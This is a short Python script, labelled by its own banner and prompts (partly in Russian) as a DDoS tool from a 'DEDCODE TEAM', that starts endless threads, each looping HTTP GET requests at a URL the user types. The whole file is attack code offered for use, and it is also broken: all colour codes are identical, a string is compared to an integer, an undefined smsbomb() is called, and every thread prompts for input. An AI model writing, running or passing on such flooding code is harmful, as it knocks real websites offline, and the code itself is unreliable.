import threading
import requests
import os
# DDoS
import colorama
import threading
import requests
import random
import os
import sys
import time
import undetected_chromedriver
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print('''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
print("\n ")
print("what do you want ddos")

inp = input("Количество bomb) >>> ")

if inp == 1:
    smsbomb()

def dos():
 url = input("Ссылка url >>> ")
 os.system('cls||clear')
 while True:
  print("<< program works >>")
  requests.get(url)
  
while True:
 threading.Thread(target=dos).start()
